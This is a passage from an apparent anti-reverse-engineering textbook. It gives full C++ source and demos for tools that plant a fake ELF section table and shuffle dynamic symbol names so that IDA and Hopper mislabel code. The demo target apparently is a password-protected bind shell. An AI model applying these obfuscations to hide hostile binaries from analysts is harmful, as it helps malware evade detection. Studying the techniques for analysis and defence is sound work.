i++, phdr++)**\n{\n\n**if (phdr->p_type == PT_LOAD)**\n{\n\n**if ((phdr->p_flags & PF_X) == 0)**\n{\nElf64_Shdr text_header = {};\ntext_header.sh_name = p_strings.size();\ntext_header.sh_type = SHT_PROGBITS;\ntext_header.sh_flags = SHF_ALLOC | SHF_WRITE;\ntext_header.sh_addr = phdr->p_vaddr;\ntext_header.sh_offset = phdr->p_offset;\ntext_header.sh_size = phdr->p_filesz;\ntext_header.sh_link = 0;\ntext_header.sh_info = 0;\ntext_header.sh_addralign = 4;\ntext_header.sh_entsize = 0;\np_strings.append(\".data\");\np_strings.push_back('\\x00');\np_data.append(reinterpret_cast<char*>(&text_header),\n\n**sizeof(text_header));**\n**return true;**\n}\n}\n}\n**return false;**\n}\n\n/**\n\n - Creates a fake sections table and appends the strings to the end of the file.\n \n - \\param[in,out] p_data the ELF binary\n\n - \\return true on success and false otherwise\n*/\n**bool append_sections(std::string& p_data)**\n{\n\n\n-----\n\n###### Chapter 3: File Format Hacks 113\n\n// this will contain the section name strings\nstd::string strings;\nstrings.push_back('\\x00');\n\n// first section is empty\nElf64_Shdr null_header = {};\np_data.append(reinterpret_cast<char*>(&null_header), sizeof(null_header));\n\n**if (!add_data_section(p_data, strings))**\n{\nstd::cerr << \"Failed to find the executable LOAD segment\" << std::endl;\n**return false;**\n}\n\n**if (!add_text_section(p_data, strings))**\n{\nstd::cerr << \"Failed to find the writable LOAD segment\" << std::endl;\n**return false;**\n}\n\n// .shstrtab\nElf64_Shdr strtab = {};\nstrtab.sh_name = strings.size();\nstrtab.sh_type = SHT_STRTAB;\nstrtab.sh_flags = 0;\nstrtab.sh_addr = 0;\nstrtab.sh_offset = p_data.size() + sizeof(Elf64_Shdr);\nstrtab.sh_size = 0;\nstrtab.sh_link = 0;\nstrtab.sh_info = 0;\nstrtab.sh_addralign = 4;\nstrtab.sh_entsize = 0;\nstrings.append(\".shstrtab\");\nstrings.push_back('\\x00');\nstrtab.sh_size = strings.size();\np_data.append(reinterpret_cast<char*>(&strtab), sizeof(strtab));\np_data.append(strings);\n\n**return true;**\n}\n\n**int main(int p_argc, char** p_argv)**\n{\n\n\n-----\n\n###### Chapter 3: File Format Hacks 114\n\n**if (p_argc != 2)**\n{\nstd::cerr << \"Usage: ./fakeHeadersHideEntry <file path>\" << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::ifstream inputFile(p_argv[1], std::ifstream::in | std::ifstream::binary);\n**if (!inputFile.is_open() || !inputFile.good())**\n{\nstd::cerr << \"Failed to ropen the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::string input((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_it\\\nerator<char>());\ninputFile.close();\n\n**if (!edit_elf_header(input))**\n{\n\n**return EXIT_FAILURE;**\n}\n\n**if (!append_sections(input))**\n{\n\n**return EXIT_FAILURE;**\n}\n\nstd::ofstream outputFile(p_argv[1], std::ofstream::out | std::ofstream::binary);\n**if (!outputFile.is_open() || !outputFile.good())**\n{\nstd::cerr << \"Failed to wopen the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\noutputFile.write(input.data(), input.length());\noutputFile.close();\n**return EXIT_SUCCESS;**\n}\n\n##### As before, use CMake to compile the project.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 115\n\n Compiling fakeHeadersHideEntry\n\nalbino-lobster@ubuntu:~/antire_book$ cd chap_3_format_hacks/fakeHeadersHideEntry/\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersHideEntry$ mkdir b\\\nuild\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersHideEntry$ cd buil\\\nd/\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersHideEntry/build$ c\\\nmake ..\n-- The CXX compiler identification is GNU 5.4.0\n-- Check for working CXX compiler: /usr/bin/c++\n-- Check for working CXX compiler: /usr/bin/c++ -- works\n-- Detecting CXX compiler ABI info\n-- Detecting CXX compiler ABI info - done\n-- Detecting CXX compile features\n-- Detecting CXX compile features - done\n-- Configuring done\n-- Generating done\n-- Build files have been written to: /home/albino-lobster/antire_book/chap_3_format_h\\\nacks/fakeHeadersHideEntry/build\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersHideEntry/build$ m\\\nake\nScanning dependencies of target fakeHeadersHideEntry\n\n[ 50%] Building CXX object CMakeFiles/fakeHeadersHideEntry.dir/src/fakeHeadersHideEnt\\\nry.cpp.o\n\n[100%] Linking CXX executable fakeHeadersHideEntry\n\n[100%] Built target fakeHeadersHideEntry\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersHideEntry/build$\n\n##### Recompile Trouble and remove the section headers table using stripBinary. Next use fakeHeadersHideEntry to append the fake section headers table.\n\n###### Using fakeHeadersHideEntry on Trouble\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersHideEntry/build$ .\\\n/fakeHeadersHideEntry ~/antire_book/chap_3_format_hacks/trouble/build/trouble\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/fakeHeadersHideEntry/build$\n\n##### The output isn’t exciting but the result is interesting. First let’s look at Trouble in Radare2.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 116\n\n Examining Trouble with fakeHeadersHideEntry in Radare2\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/trouble/build$ radare2 ./trou\\\nble\nWarning: Cannot initialize dynamic strings\n-- You can 'copy/paste' bytes using the cursor in visual mode 'c' and using the 'y' \\\nand 'Y' keys\n\n[0x004002f2]> aaa\n\n[x] Analyze all flags starting with sym. and entry0 (aa)\n\n[x] Analyze len bytes of instructions for references (aar)\n\n[x] Analyze function calls (aac)\n\n[ ] [*] Use -AA or aaaa to perform additional experimental analysis.\n\n[x] Constructing a function name for fcn.* and sym.func.* functions (aan))\n\n[0x004002f2]> pdf\n/ (fcn) entry0 42\n| entry0 ();\n| 0x004002f2 4831ed xor rbp, rbp\n| 0x004002f5 4989d1 mov r9, rdx\n| 0x004002f8 5e pop rsi\n| 0x004002f9 4889e2 mov rdx, rsp\n| 0x004002fc 4883e4f0 and rsp, 0xfffffffffffffff0\n| 0x00400300 49c7c09f1340. mov r8, fcn.0040139f ; \"PX.\" @ 0x40139f\n| 0x00400307 48c7c1200140. mov rcx, fcn.00400120 ; \"PX.\" @ 0x400120\n| 0x0040030e 48c7c7300140. mov rdi, 0x400130\n**\\** 0x00400315 e84c020000 call fcn.00400566\n| | ; JMP XREF from 0x0040031a (entry0)\n| `-> 0x0040031a ebfe jmp 0x40031a\n\n[0x004002f2]> iS\n\n[Sections]\nidx=00 vaddr=0x00000000 paddr=0x00000000 sz=0 vsz=0 perm=----- name=\nidx=01 vaddr=0x00400015 paddr=0x00000000 sz=7175 vsz=7175 perm=--r-x name=.text\nidx=02 vaddr=0x00601fe8 paddr=0x00001fe8 sz=376 vsz=376 perm=--rw- name=.data\nidx=03 vaddr=0x00000000 paddr=0x00002658 sz=23 vsz=23 perm=----- name=.shstrtab\nidx=04 vaddr=0x00400000 paddr=0x00000000 sz=7196 vsz=7196 perm=m-r-x name=LOAD0\nidx=05 vaddr=0x00601fe8 paddr=0x00001fe8 sz=376 vsz=1208 perm=m-rw- name=LOAD1\nidx=06 vaddr=0x00000000 paddr=0x00000000 sz=0 vsz=0 perm=m-rw- name=GNU_STACK\nidx=07 vaddr=0x00601fe8 paddr=0x00001fe8 sz=24 vsz=24 perm=m-r-- name=GNU_RELRO\nidx=08 vaddr=0x00400000 paddr=0x00000000 sz=64 vsz=64 perm=m-rw- name=ehdr\n\n9 sections\n\n[0x004002f2]>\n\n\n-----\n\n###### Chapter 3: File Format Hacks 117\n\n##### This obfuscation technique has no affect on Radare2. This further confirms that Radare2 prefers the information in the program headers even when the section headers are present. Let’s contrast that against IDA. Here is IDA’s disassembly of the entry point.\n\n###### Examining Trouble with fakeHeadersHideEntry in IDA\n\n.text:00000000004002F2 public start\n.text:00000000004002F2 start proc near\n.text:00000000004002F2\n.text:00000000004002F2 arg_40 = qword ptr 48h\n.text:00000000004002F2\n.text:00000000004002F2 ; FUNCTION CHUNK AT .text:000000000040021E SIZE 0000001D BYTES\n.text:00000000004002F2\n.text:00000000004002F2 add [rbp+1], bh\n.text:00000000004002F8 call sub_400990\n.text:00000000004002FD jmp loc_40021E\n.text:0000000000400302 ; ----------------------------------------------------.text:0000000000400302\n.text:0000000000400302 loc_400302: ; CODE XREF: start-C4 j\n.text:0000000000400302 call sub_40061B\n.text:0000000000400307 ; ----------------------------------------------------.text:0000000000400307 xor rbp, rbp\n.text:000000000040030A mov r9, rdx\n.text:000000000040030D pop rsi\n.text:000000000040030E mov rdx, rsp\n.text:0000000000400311 and rsp, 0FFFFFFFFFFFFFFF0h\n.text:0000000000400315 mov r8, (offset loc_40139B+4)\n.text:000000000040031C mov rcx, 400120h\n.text:0000000000400323 mov rdi, offset byte_400130\n.text:000000000040032A call sub_40057B\n.text:000000000040032F ; ----------------------------------------------------.text:000000000040032F\n.text:000000000040032F loc_40032F: ; CODE XREF: start:loc_40032F j\n.text:000000000040032F jmp short loc_40032F\n.text:000000000040032F start endp ; sp-analysis failed\n\n##### Compare this disassembly to the Radare2 disassembly. The IDA disassembly is clearly incorrect. This makes it clear that IDA prefers the sections headers table over the program headers.\n\n Finally, let’s look at how Hopper handles this obfuscation technique.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 118\n\n Examining Trouble with fakeHeadersHideEntry in Hopper\n\nEntryPoint:\n00000000004002f2 xor rbp, rbp\n00000000004002f5 mov r9, rdx\n00000000004002f8 pop rsi ; argument #2 for method sub_400566\n00000000004002f9 mov rdx, rsp ; argument #3 for method sub_400566\n00000000004002fc and rsp, 0xfffffffffffffff0\n0000000000400300 mov r8, 0x40139f\n0000000000400307 mov rcx, 0x400120\n000000000040030e mov rdi, 0x400130 ; argument #1 for method sub_400566\n0000000000400315 call sub_400566\n000000000040031a jmp 0x40031a ; XREF=EntryPoint+40\n; endp\n\n##### You can see that Hopper, like Radare2, also disassembles the entry point correctly. It appears that this trick is only useful against IDA, but it is still a useful tool to keep in our toolbox.\n\n### Mixing the Symbols\n\n##### This chapter has, so far, emphasized file format hacks using the statically compiled Trouble. However, this section will discuss an anti reverse engineering technique that requires the dynamic symbol table to be present. Therefore, you’ll have to revert back to using the chapter one version of Trouble for this section.\n\n I first saw this trick in a blog written by Andre Pawlowski³⁵. In this technique, you’ll append a fake dynamic symbol table to the end of the binary. Then you’ll repoint the offset in the .dynmsym section header to point to the fake symbol table. Finally, you’ll mix all of the symbol name pointers for the FUNC symbols. This will cause the disassemblers that rely on the sections table, instead of the program headers, to display incorrect function names in the disassembly.\n\n I wrote a tool to mix the dynamic symbols. You can find it in the chapter three direc- tory under mixDynamicSymbols. There are two files in the project: CMakeLists.txt and mixDynamicSymbols.cpp.\n\n###### ³⁵https://h4des.org/blog/index.php?/archives/346-ELF-obfuscation-let-analysis-tools-show-wrong-external-symbol[calls.html](https://h4des.org/blog/index.php?/archives/346-ELF-obfuscation-let-analysis-tools-show-wrong-external-symbol-calls.html)\n\n\n-----\n\n###### Chapter 3: File Format Hacks 119\n\n chap_3_format_hacks/mixDynamicSymbols/CMakeLists.txt\n\nproject(mixDynamicSymbols CXX)\ncmake_minimum_required(VERSION 3.0)\n\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow\")\nadd_executable(${PROJECT_NAME} src/mixDynamicSymbols.cpp)\n\n###### chap_3_format_hacks/mixDynamicSymbols/src/mixDynamicSymbols.cpp\n\n#include <cstdlib>\n#include <iostream>\n#include <fstream>\n#include <iomanip>\n#include <cstring>\n#include <elf.h>\n#include <vector>\n\n/*\n\n - This tool takes in an ELF binary that has a sections table and uses dynamic\n\n - linkage and attachs a fake dynamic symbol table at the end of the binary.\n\n - Then the symbol names in the fake symbol table are mixed. This will cause\n\n - disassemblers that place too much trust in the sections table, like IDA,\n\n - to display the wrong symbol name in the disassembly.\n*/\n\n/*\n\n - Finds the SHT_DYNSYM in the sections table, points the offset to the end\n\n - of the binary, and copies the existing dynsym to the end of the file. Then\n\n - loops over the symbols in the new dynsym and changes all the name offsets\n\n - around\n \n - \\param[in,out] p_data the ELF binary we are modifying\n\n - \\return truee if we didn't encounter and error and false otherwise\n*/\n**bool append_dynsym(std::string& p_data)**\n{\n\n**if (p_data[0] != 0x7f || p_data[1] != 'E' || p_data[2] != 'L' ||**\n\np_data[3] != 'F')\n{\nstd::cerr << \"Bad magic.\" << std::endl;\n\n\n-----\n\n###### Chapter 3: File Format Hacks 120\n\n**return false;**\n}\n\nElf64_Ehdr* ehdr = reinterpret_cast<Elf64_Ehdr*>(&p_data[0]);\n**if (ehdr->e_shoff == 0)**\n{\nstd::cerr << \"The binary has no sections table\" << std::endl;\n**return false;**\n}\n\n**if (ehdr->e_shentsize != sizeof(Elf64_Shdr))**\n{\nstd::cerr << \"Unexpected section header size\" << std::endl;\n**return false;**\n}\n\n// loop over the sections until we hit .dynsym\nElf64_Shdr* shdr = reinterpret_cast<Elf64_Shdr*>(&p_data[0] + ehdr->e_shoff);\n**for (int i = 0; i < ehdr->e_shnum; i++, shdr++)**\n{\n\n**if (shdr->sh_type == SHT_DYNSYM)**\n{\nstd::size_t offset = shdr->sh_offset;\n\n// repoint the offset to the end of the file\nshdr->sh_offset = p_data.size();\n\n// copy the dymsym to the end of the file\np_data.append(p_data.data() + offset, shdr->sh_size);\n\n// collects all the string offsets\nstd::vector<int> name_offsets;\nstd::vector<Elf64_Sym*> symbols;\nElf64_Sym* symbol = reinterpret_cast<Elf64_Sym*>(&p_data[0] + shdr->sh_of\\\nfset);\n\n**for ( ; reinterpret_cast<char*>(symbol) < p_data.data() +**\n\np_data.size(); ++symbol)\n{\n\n**if (ELF64_ST_TYPE(symbol->st_info) == STT_FUNC &&**\n\nELF64_ST_BIND(symbol->st_info) == STB_GLOBAL &&\nsymbol->st_value == 0)\n{\nname_offsets.push_back(symbol->st_name);\n\n\n-----\n\n###### Chapter 3: File Format Hacks 121\n\nsymbols.push_back(symbol);\n}\n}\n\n// mix the symbols\nsrand(time(NULL));\n**for (std::vector<Elf64_Sym*>::iterator it = symbols.begin();**\nit != symbols.end(); ++it)\n{\n\n**int index = rand() % name_offsets.size();**\n(*it)->st_name = name_offsets[index];\nname_offsets.erase(name_offsets.begin() + index);\n}\n\n**return true;**\n}\n}\n\nstd::cerr << \"Never found the dynamic symbol table\" << std::endl;\n**return false;**\n}\n\n**int main(int p_argc, char** p_argv)**\n{\n\n**if (p_argc != 2)**\n{\nstd::cerr << \"Usage: ./mixDynamicSymbols <file path>\" << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::ifstream inputFile(p_argv[1], std::ifstream::in | std::ifstream::binary);\n**if (!inputFile.is_open() || !inputFile.good())**\n{\nstd::cerr << \"Failed to ropen the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\nstd::string input((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_it\\\nerator<char>());\ninputFile.close();\n\n**if (!append_dynsym(input))**\n{\n\n\n-----\n\n###### Chapter 3: File Format Hacks 122\n\n**return EXIT_FAILURE;**\n}\n\nstd::ofstream outputFile(p_argv[1], std::ofstream::out | std::ofstream::binary);\n**if (!outputFile.is_open() || !outputFile.good())**\n{\nstd::cerr << \"Failed to wopen the provided file: \" << p_argv[1] << std::endl;\n**return EXIT_FAILURE;**\n}\n\noutputFile.write(input.data(), input.length());\noutputFile.close();\n**return EXIT_SUCCESS;**\n}\n\n##### As usual, you should compile with CMake.\n\n###### Compiling mixDynamicSymbols\n\nalbino-lobster@ubuntu:~/antire_book$ cd chap_3_format_hacks/mixDynamicSymbols/\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/mixDynamicSymbols$ mkdir build\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/mixDynamicSymbols$ cd build/\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/mixDynamicSymbols/build$ cmak\\\ne ..\n-- The CXX compiler identification is GNU 5.4.0\n-- Check for working CXX compiler: /usr/bin/c++\n-- Check for working CXX compiler: /usr/bin/c++ -- works\n-- Detecting CXX compiler ABI info\n-- Detecting CXX compiler ABI info - done\n-- Detecting CXX compile features\n-- Detecting CXX compile features - done\n-- Configuring done\n-- Generating done\n-- Build files have been written to: /home/albino-lobster/antire_book/chap_3_format_h\\\nacks/mixDynamicSymbols/build\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/mixDynamicSymbols/build$ make\nScanning dependencies of target mixDynamicSymbols\n\n[ 50%] Building CXX object CMakeFiles/mixDynamicSymbols.dir/src/mixDynamicSymbols.cpp\\\n.o\n\n[100%] Linking CXX executable mixDynamicSymbols\n\n[100%] Built target mixDynamicSymbols\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/mixDynamicSymbols/build$\n\n\n-----\n\n###### Chapter 3: File Format Hacks 123\n\n##### mixDynamicSymbols must be used on a binary that has dynamic symbols. For this reason, go back to using the chapter one version of Trouble. Before using mixDynamicSymbols on Trouble, let’s take a quick look at the .dynsym section header (the output is truncated to focus on .dynsym).\n\n###### Trouble’s .dysym section header\n\nalbino-lobster@ubuntu:~/antire_book/chap_1_introduction/trouble/build$ readelf -S ./t\\\nrouble\nThere are 36 section headers, starting at offset 0x3c40:\n\nSection Headers:\n\n[Nr] Name Type Address Offset\nSize EntSize Flags Link Info Align\n\n[ 5] .dynsym DYNSYM 0000000000400300 00000300\n0000000000000348 0000000000000018 A 6 1 8\n\n##### Importantly, note that the offset is 0x300. Also, it’s worthwhile to look at the dynamic symbol table to see how that’s going to change.\n\n###### Trouble’s .dynsym before mixing the symbols\n\nalbino-lobster@ubuntu:~/antire_book/chap_1_introduction/trouble/build$ readelf --dyn-\\\nsym ./trouble\n\nSymbol table '.dynsym' contains 35 entries:\nNum: Value Size Type Bind Vis Ndx Name\n0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND\n1: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterTMCloneTab\n2: 0000000000000000 0 FUNC GLOBAL DEFAULT UND accept@GLIBC_2.4 (2)\n3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND memcmp@GLIBC_2.2.5 (3)\n4: 0000000000000000 0 FUNC GLOBAL DEFAULT UND perror@GLIBC_2.2.5 (3)\n5: 0000000000000000 0 FUNC GLOBAL DEFAULT UND htonl@GLIBC_2.2.5 (3)\n6: 0000000000000000 0 FUNC GLOBAL DEFAULT UND close@GLIBC_2.2.5 (3)\n7: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fork@GLIBC_2.2.5 (3)\n8: 0000000000000000 0 FUNC GLOBAL DEFAULT UND bind@GLIBC_2.2.5 (3)\n9: 0000000000000000 0 FUNC GLOBAL DEFAULT UND read@GLIBC_2.2.5 (3)\n10: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fwrite@GLIBC_2.2.5 (3)\n11: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__\n12: 0000000000000000 0 FUNC GLOBAL DEFAULT UND execve@GLIBC_2.2.5 (3)\n13: 0000000000000000 0 FUNC GLOBAL DEFAULT UND htons@GLIBC_2.2.5 (3)\n\n\n-----\n\n###### Chapter 3: File Format Hacks 124\n\n14: 0000000000000000 0 FUNC GLOBAL DEFAULT UND listen@GLIBC_2.2.5 (3)\n15: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _Jv_RegisterClasses\n16: 0000000000000000 0 FUNC GLOBAL DEFAULT UND dup2@GLIBC_2.2.5 (3)\n17: 0000000000000000 0 FUNC GLOBAL DEFAULT UND socket@GLIBC_2.2.5 (3)\n18: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMCloneTable\n19: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.\\\n2.5 (3)\n\n20: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __stack_chk_fail@GLIBC_2.2\\\n.5 (3)\n\n21: 00000000006020a8 0 NOTYPE GLOBAL DEFAULT 25 _edata\n22: 0000000000602098 0 NOTYPE GLOBAL DEFAULT 25 __data_start\n23: 00000000006020d0 0 NOTYPE GLOBAL DEFAULT 26 _end\n24: 0000000000400c06 41 FUNC GLOBAL DEFAULT 14 check_password\n25: 0000000000602098 0 NOTYPE WEAK DEFAULT 25 data_start\n26: 0000000000400ee0 4 OBJECT GLOBAL DEFAULT 16 _IO_stdin_used\n27: 0000000000400e60 101 FUNC GLOBAL DEFAULT 14 __libc_csu_init\n28: 0000000000400b10 42 FUNC GLOBAL DEFAULT 14 _start\n29: 00000000006020a8 0 NOTYPE GLOBAL DEFAULT 26 __bss_start\n30: 0000000000400c2f 558 FUNC GLOBAL DEFAULT 14 main\n31: 00000000004009d0 0 FUNC GLOBAL DEFAULT 11 _init\n32: 00000000006020c0 8 OBJECT GLOBAL DEFAULT 26 stderr@GLIBC_2.2.5 (3)\n33: 0000000000400ed0 2 FUNC GLOBAL DEFAULT 14 __libc_csu_fini\n34: 0000000000400ed4 0 FUNC GLOBAL DEFAULT 15 _fini\n\n##### Now use mixDynamicSymbols on Trouble.\n\n###### Applying mixDynamicSymbols to Trouble\n\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/mixDynamicSymbols/build$ ./mi\\\nxDynamicSymbols ~/antire_book/chap_1_introduction/trouble/build/trouble\nalbino-lobster@ubuntu:~/antire_book/chap_3_format_hacks/mixDynamicSymbols/build$\n\n##### No fancy output on success, but take a look at the .dynsym section header now.\n\n\n-----\n\n###### Chapter 3: File Format Hacks 125\n\n Trouble’s modified .dynsym\n\nalbino-lobster@ubuntu:~/antire_book/chap_1_introduction/trouble/build$ readelf -S ./t\\\nrouble\nThere are 36 section headers, starting at offset 0x3c40:\n\nSection Headers:\n\n[Nr] Name Type Address Offset\nSize EntSize Flags Link Info Align\n\n[ 5] .dynsym DYNSYM 0000000000400300 00004540\n0000000000000348 0000000000000018 A 6 1 8\n\n##### Instead of pointing at 0x300 the offset now points at the fake symbol table we copied to 0x4540. Let’s look at how the dynamic symbol table has changed.\n\n###### Trouble’s mixed .dynsym\n\nalbino-lobster@ubuntu:~/antire_book/chap_1_introduction/trouble/build$ readelf --dyn-\\\nsym ./trouble\n\nSymbol table '.dynsym' contains 35 entries:\nNum: Value Size Type Bind Vis Ndx Name\n0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND\n1: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterTMCloneTab\n2: 0000000000000000 0 FUNC GLOBAL DEFAULT UND memcmp@GLIBC_2.4 (2)\n3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fwrite@GLIBC_2.2.5 (3)\n4: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.\\\n2.5 (3)\n\n5: 0000000000000000 0 FUNC GLOBAL DEFAULT UND accept@GLIBC_2.2.5 (3)\n6: 0000000000000000 0 FUNC GLOBAL DEFAULT UND socket@GLIBC_2.2.5 (3)\n7: 0000000000000000 0 FUNC GLOBAL DEFAULT UND close@GLIBC_2.2.5 (3)\n8: 0000000000000000 0 FUNC GLOBAL DEFAULT UND perror@GLIBC_2.2.5 (3)\n9: 0000000000000000 0 FUNC GLOBAL DEFAULT UND bind@GLIBC_2.2.5 (3)\n10: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __stack_chk_fail@GLIBC_2.2\\\n.5 (3)\n\n11: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__\n12: 0000000000000000 0 FUNC GLOBAL DEFAULT UND execve@GLIBC_2.2.5 (3)\n13: 0000000000000000 0 FUNC GLOBAL DEFAULT UND htonl@GLIBC_2.2.5 (3)\n14: 0000000000000000 0 FUNC GLOBAL DEFAULT UND dup2@GLIBC_2.2.5 (3)\n15: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _Jv_RegisterClasses\n16: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fork@GLIBC_2.2.5 (3)\n17: 0000000000000000 0 FUNC GLOBAL DEFAULT UND listen@GLIBC_2.2.5 (3)\n\n\n-----\n\n###### Chapter 3: File Format Hacks 126\n\n18: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMCloneTable\n19: 0000000000000000 0 FUNC GLOBAL DEFAULT UND read@GLIBC_2.2.5 (3)\n20: 0000000000000000 0 FUNC GLOBAL DEFAULT UND htons@GLIBC_2.2.5 (3)\n21: 00000000006020a8 0 NOTYPE GLOBAL DEFAULT 25 _edata\n22: 0000000000602098 0 NOTYPE GLOBAL DEFAULT 25 __data_start\n23: 00000000006020d0 0 NOTYPE GLOBAL DEFAULT 26 _end\n24: 0000000000400c06 41 FUNC GLOBAL DEFAULT 14 check_password\n25: 0000000000602098 0 NOTYPE WEAK DEFAULT 25 data_start\n26: 0000000000400ee0 4 OBJECT GLOBAL DEFAULT 16 _IO_stdin_used\n27: 0000000000400e60 101 FUNC GLOBAL DEFAULT 14 __libc_csu_init\n28: 0000000000400b10 42 FUNC GLOBAL DEFAULT 14 _start\n29: 00000000006020a8 0 NOTYPE GLOBAL DEFAULT 26 __bss_start\n30: 0000000000400c2f 558 FUNC GLOBAL DEFAULT 14 main\n31: 00000000004009d0 0 FUNC GLOBAL DEFAULT 11 _init\n32: 00000000006020c0 8 OBJECT GLOBAL DEFAULT 26 stderr@GLIBC_2.2.5 (3)\n33: 0000000000400ed0 2 FUNC GLOBAL DEFAULT 14 __libc_csu_fini\n34: 0000000000400ed4 0 FUNC GLOBAL DEFAULT 15 _fini\n\n##### Look at symbol number two. Before mixDynamicSymbols the symbol name was “accept@GLIBC_2.4 (2)” but now it reads “memcp@GLIBC_2.4 (2)”. How does this affect the disassembly? Check out the function check_password() in IDA.\n\n###### check_password() in IDA after using mixDynamicSymbols\n\n.text:0000000000400C06 check_password proc near ; CODE XREF: main+194 p\n.text:0000000000400C06\n.text:0000000000400C06 p_password = qword ptr -8\n.text:0000000000400C06\n.text:0000000000400C06 push rbp\n.text:0000000000400C07 mov rbp, rsp\n.text:0000000000400C0A sub rsp, 10h\n.text:0000000000400C0E mov [rbp+p_password], rdi\n.text:0000000000400C12 mov rax, [rbp+p_password]\n.text:0000000000400C16 mov edx, 20h ; len\n.text:0000000000400C1B mov rsi, rax ; addr\n.text:0000000000400C1E mov edi, offset s_password ; \"GisfUtI89aMR\\\nKJvkz31NuXtq9155kEGa\"\n.text:0000000000400C23 call _bind\n.text:0000000000400C28 test eax, eax\n.text:0000000000400C2A setnz al\n.text:0000000000400C2D leave\n.text:0000000000400C2E retn\n\n\n-----\n\n###### Chapter 3: File Format Hacks 127\n\n.text:0000000000400C2E check_password endp\n.text:0000000000400C2E\n\n##### Notice how the call at 0x400c23 says _bind? That should be memcmp. The subtlety of this technique should not be underrated. A reverse engineer is only going to notice the symbol name is incorrect if they come across it while doing dynamic analysis or if they compare the .dynsym offsets in the section headers and program headers. Unfortunately, once again, Radare2 is immune to this obfuscation technique.\n\n###### Radare2 still shows memcmp()\n\nalbino-lobster@ubuntu:~/antire_book/chap_1_introduction/trouble/build$ radare2 ./trou\\\nble\n-- This is an unacceptable milion year dungeon.\n\n[0x00400b10]> aaa\n\n[x] Analyze all flags starting with sym. and entry0 (aa)\n\n[x] Analyze len bytes of instructions for references (aar)\n\n[x] Analyze function calls (aac)\n\n[ ] [*] Use -AA or aaaa to perform additional experimental analysis.\n\n[x] Constructing a function name for fcn.* and sym.func.* functions (aan))\n\n[0x00400b10]> pdf @ sym.check_password\n/ (fcn) sym.check_password 41\n| sym.check_password ();\n| ; var int local_8h @ rbp-0x8\n| ; CALL XREF from 0x00400dc3 (sym.main)\n| 0x00400c06 55 push rbp\n| 0x00400c07 4889e5 mov rbp, rsp\n| 0x00400c0a 4883ec10 sub rsp, 0x10\n| 0x00400c0e 48897df8 mov qword [rbp - local_8h], rdi\n| 0x00400c12 488b45f8 mov rax, qword [rbp - local_8h]\n| 0x00400c16 ba20000000 mov edx, 0x20\n| 0x00400c1b 4889c6 mov rsi, rax\n| 0x00400c1e bf000f4000 mov edi, str.GisfUtI89aMRKJvkz31NuXtq9155k\\\nEGa ; \"GisfUtI89aMRKJvkz31NuXtq9155kEGa\" @ 0x400f00\n| 0x00400c23 e848feffff call sym.imp.memcmp\n| 0x00400c28 85c0 test eax, eax\n| 0x00400c2a 0f95c0 setne al\n| 0x00400c2d c9 leave\n**\\** 0x00400c2e c3 ret\n\n[0x00400b10]>\n\n\n-----\n\n###### Chapter 3: File Format Hacks 128\n\n##### Interestingly, while Hopper has correctly handled some of the other file format obfuscations it does fall victim this particular attack.\n\n###### check_password() in Hopper with mixDynamicSymbols\n\ncheck_password:\n0000000000400c06 push rbp ; XREF=main+404\n0000000000400c07 mov rbp, rsp\n0000000000400c0a sub rsp, 0x10\n0000000000400c0e mov qword [ss:rbp+var_8], rdi\n0000000000400c12 mov rax, qword [ss:rbp+var_8]\n0000000000400c16 mov edx, 0x20 ; argument \"address_len\" for method j_bind\n0000000000400c1b mov rsi, rax ; argument \"address\" for method j_bind\n0000000000400c1e mov edi, 0x400f00 ; \"GisfUtI89aMRKJvkz31NuXtq9155kEGa\", argum\\\nent \"socket\" for method j_bind\n0000000000400c23 call j_bind\n0000000000400c28 test eax, eax\n0000000000400c2a setne al\n0000000000400c2d leave\n0000000000400c2e ret\n; endp\n\n\n-----\n\n# Chapter 4: Fighting Off String Analysis\n\n##### In the previous chapters a lot of work has gone into preventing a reverse engineer from figuring out the password to the Trouble 